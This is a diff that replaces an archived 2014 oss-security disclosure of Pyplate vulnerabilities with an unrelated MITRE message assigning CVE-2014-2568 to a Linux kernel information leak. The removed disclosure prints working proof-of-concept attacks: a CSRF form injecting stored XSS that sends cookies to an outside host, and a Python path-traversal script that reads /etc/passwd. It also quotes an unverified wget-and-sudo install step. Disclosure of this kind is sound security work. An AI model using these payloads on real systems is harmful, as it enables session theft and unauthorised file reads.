@@ -1,118 +1,43 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/05/14/3
-Message-ID: <20140514112121.GA18131@kludge.henri.nerv.fi>
-Date: Wed, 14 May 2014 14:21:21 +0300
-From: Henri Salo <henri@...v.fi>
-To: oss-security@...ts.openwall.com
-Cc: steveb0576@...oo.co.uk, abuse@...LATE.COM, moderators@...db.org
-Subject: CVE request: Pyplate multiple vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/03/20/16
+Message-Id: <201403201945.s2KJjaN7016175@linus.mitre.org>
+Date: Thu, 20 Mar 2014 15:45:36 -0400 (EDT)
+From: cve-assign@...re.org
+To: pmatouse@...hat.com
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com, zoltan.kiss@...rix.com, mtsirkin@...hat.com
+Subject: Re: CVE request -- kernel: net: potential information leak when ubuf backed skbs are skb_zerocopy()ied
 Content-Type: text/plain; charset=utf-8
 
-Hello list,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-My friend Teemu V. "requested" security audit for Pyplate. While quickly
-checking quality of this software I noticed following issues. This is not a full
-security audit as I don't have much free time.
+> An information flaw was found in the way skb_zerocopy() copied skbs that
+> are backed by userspace buffers (for example vhost-net and recent xen
+> netback). Once the source skb is consumed, ubuf destructor is called and
+> potentially releases the corresponding userspace buffers, which can then
+> for example be repurposed, while the destination skb is still pointing
+> to the them.
+> 
+> This issue is similar to CVE-2014-0131.
+> 
+> Upstream patch:
+> https://lkml.org/lkml/2014/3/20/421
 
-Tested version: v0.08 (still beta)
-Vendor notification: 2014-05-13
+Use CVE-2014-2568.
 
-Issue 1.
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.14 (SunOS)
 
-Installation instruction tells user to execute following commands without
-checking any checksums or similar:
-
-> wget http://pyplate.com/pyplate_install.sh
-> chmod +x ./pyplate_install.sh
-> sudo ./pyplate_install.sh
-
-Issue 2.
-
-File /usr/lib/cgi-bin/create_passwd_file.py creates passwd.db for admin user
-password with world readable permissions. I like that salt :]
-
- 20     salt="bla"
- 21 
- 22     hash=crypt.crypt(random_string,'$6$'+salt+'$')
- 23     usercredentials="admin:"+hash
- 24 
- 25     passwdf=open("./passwd.db",'w')
- 26     passwdf.write(usercredentials)
- 27     passwdf.close() 
-
--rw-r--r-- 1 www-data www-data 99 May 13 20:45 /usr/share/pyplate/passwd.db
-
-Issue 3.
-
-Application is not using HttpOnly (nor Secure) flag in cookie "id".
-
-Issue 4.
-
-CSRF + XSS with cookie stealing PoC:
-
-<html>
-  <body>
-    <form action="http://example.com/admin/addScript.py" method="POST">
-      <input type="hidden" name="title" value="&lt;script&gt;new&#32;Image&#40;&#41;&#46;src&#61;&quot;http&#58;&#47;&#47;bugs&#46;fi&#47;evil&#46;py&#63;cookie&#61;&quot;&#32;encodeURI&#40;document&#46;cookie&#41;&#59;&lt;&#47;script&gt;" />
-      <input type="hidden" name="file" value="bugs" />
-      <input type="hidden" name="category" value="&#47;" />
-      <input type="hidden" name="post" value="&lt;p&gt;bugs&lt;&#47;p&gt;&#13;&#10;" />
-      <input type="hidden" name="tags" value="" />
-      <input type="hidden" name="description" value="" />
-      <input type="hidden" name="state" value="new" />
-      <input type="submit" value="Submit request" />
-    </form>
-  </body>
-</html>
-
-There is no CSRF protection and most of admin functionality contain stored XSS
-issues.
-
-Issue 5.
-
-File /usr/lib/cgi-bin/download.py is used to download backup file from
-installation after admin has created it in web-ui. Note the comment.
-
- 21 # need to check that the filename doesn't contain slashes
- 26     path = pyplate.getCMSRoot() + "/backup/" + filename
- 27     file = open (path, 'rb')
-
-Normally HTTP POST message looks like:
-
-"""
-POST /cgi-bin/download.py HTTP/1.1
-Host: 10.0.0.53
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://10.0.0.53/admin/manage_backups.py
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 40
-
-filename=backup_2014.05.13.223720.tar.gz
-"""
-
-Attacker can use this without authentication to download arbitrary files from
-the system. File needs to be readable by web server process. PoC for /etc/passwd
-below:
-
-"""
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-
-import requests
-payload = {'filename': '../../../../etc/passwd'}
-r = requests.post('http://example.org/cgi-bin/download.py',
-data=payload)
-print r.text
-"""
-
-If author responds with fixed in version I can coordinate this and send email to
-abuse@ address for all users (which is not that many currently).
-
----
-Henri Salo
-
-Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
+iQEcBAEBAgAGBQJTK0KNAAoJEKllVAevmvms+UkH/jUSasHTIEdX1iRHqyVSpHjA
+b0PAYGAs7fZ3s/WtslGVEVaC7+ShGIK2wzxPWVe+6iM0WTPykzKyWmR8pOU8FKLD
+2ChlkU/V9tKcU1IS+2TEAnX7VQO/bbftbl+HctKWQDSPg99/NuinO3oxPheaktbw
+8OeH6X+mvPspKV0yRjJ8oKvfgExbmANKjE34U+vbxQH8g2H+JnU9qC1EGmpitOkk
+0Aw5mXjK8rhhCbi8ehBegjB1cui8TmjpfJfI2RIBzaSNLPIbT82tAcnIPjDBY5x+
+qwxvxkx0uJnt7bDS5ESPUNw2QIRyOQUIAwk4rBIA8fHIMOjPGzDAKEj+wqeN/6s=
+=vvFF
+-----END PGP SIGNATURE-----
